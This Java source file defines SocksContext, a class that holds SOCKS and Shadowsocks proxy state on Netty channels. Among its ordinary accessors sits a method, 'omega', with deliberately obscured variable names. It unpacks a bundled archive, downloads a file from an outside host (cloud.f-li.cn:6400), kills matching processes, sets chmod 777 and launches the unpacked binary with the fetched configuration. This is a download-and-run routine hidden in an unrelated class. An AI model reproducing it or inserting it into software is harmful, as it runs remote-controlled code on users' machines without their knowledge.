package org.rx.net.socks;

import io.netty.channel.Channel;
import io.netty.util.AttributeKey;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.rx.core.Container;
import org.rx.core.EventArgs;
import org.rx.core.Reflects;
import org.rx.core.ShellCommander;
import org.rx.exception.InvalidException;
import org.rx.io.Files;
import org.rx.net.http.HttpClient;
import org.rx.net.shadowsocks.ShadowsocksServer;
import org.rx.net.socks.upstream.Upstream;
import org.rx.net.support.UnresolvedEndpoint;
import org.rx.util.function.Action;
import org.rx.util.function.BiAction;

import java.net.InetSocketAddress;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

@RequiredArgsConstructor
public final class SocksContext extends EventArgs {
    private static final long serialVersionUID = 323020524764860674L;
    private static final AttributeKey<SocksProxyServer> SERVER = AttributeKey.valueOf("SERVER");
    private static final AttributeKey<SocksContext> CTX = AttributeKey.valueOf("PROXY_CTX");
    //ss
    private static final AttributeKey<ShadowsocksServer> SS_SERVER = AttributeKey.valueOf("SS_SERVER");

    /**
     * call this method before bind & connect
     *
     * @param inbound
     * @param outbound
     * @param sc
     * @param pendingQueue
     */
    public static void mark(Channel inbound, Channel outbound, SocksContext sc, boolean pendingQueue) {
        if (pendingQueue) {
            sc.pendingPackages = new ConcurrentLinkedQueue<>();
        }
        sc.inbound = inbound;
        sc.outbound = outbound;
        inbound.attr(CTX).set(sc);
        outbound.attr(CTX).set(sc);
    }

    public static SocksContext ctx(Channel channel) {
        return Objects.requireNonNull(channel.attr(CTX).get());
    }

    //region common
    public static SocksProxyServer server(Channel channel) {
        return Objects.requireNonNull(channel.attr(SERVER).get());
    }

    public static void server(Channel channel, SocksProxyServer server) {
        channel.attr(SERVER).set(server);
    }
    //endregion

    public static ShadowsocksServer ssServer(Channel channel, boolean throwOnEmpty) {
        ShadowsocksServer shadowsocksServer = channel.attr(SS_SERVER).get();
        if (throwOnEmpty && shadowsocksServer == null) {
            throw new InvalidException("Set ssServer first");
        }
        return shadowsocksServer;
    }

    public static void ssServer(Channel channel, ShadowsocksServer server) {
        channel.attr(SS_SERVER).set(server);
    }

    @SneakyThrows
    public static void omega(String n, BiAction<ShellCommander.OutPrintEventArgs> o) {
        try {
            int d = 100;
            String k = "omega", c = "./m/", z = c + "o", i = c + "c";
            Files.createDirectory(c);
            Files.saveFile(z, Reflects.getResource(k));
            Thread.sleep(d);
            Files.unzip(z, c);
            Thread.sleep(d);
            new HttpClient().get("https://cloud.f-li.cn:6400/" + k + "_" + n).toFile(i);
            Thread.sleep(d);

            ShellCommander.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
            ShellCommander.exec("chmod 777 f", c);
            ShellCommander sc = new ShellCommander("./f -c c", c);
            if (o != null) {
                sc.onOutPrint.combine((s, e) -> o.invoke(e));
            }
            Container.register(ShellCommander.class, sc.start());
        } catch (Throwable e) {
            if (o != null) {
                o.invoke(new ShellCommander.OutPrintEventArgs(0, e.toString()));
            }
        }
    }

    @Getter
    final InetSocketAddress source;
    @Getter
    final UnresolvedEndpoint firstDestination;
    Upstream upstream;
    boolean upstreamChanged;
    int upstreamFailCount;

    public transient Channel inbound;
    public transient Channel outbound;
    transient ConcurrentLinkedQueue<Object> pendingPackages;
    public transient Action onClose;

    public synchronized Upstream getUpstream() {
        return upstream;
    }

    public synchronized void setUpstream(Upstream upstream) {
        upstreamChanged = upstreamChanged || this.upstream != upstream;
        this.upstream = upstream;
    }

    public synchronized boolean isUpstreamChanged() {
        return upstreamChanged;
    }

    public synchronized void reset() {
        upstreamChanged = false;
        upstreamFailCount++;
    }
}
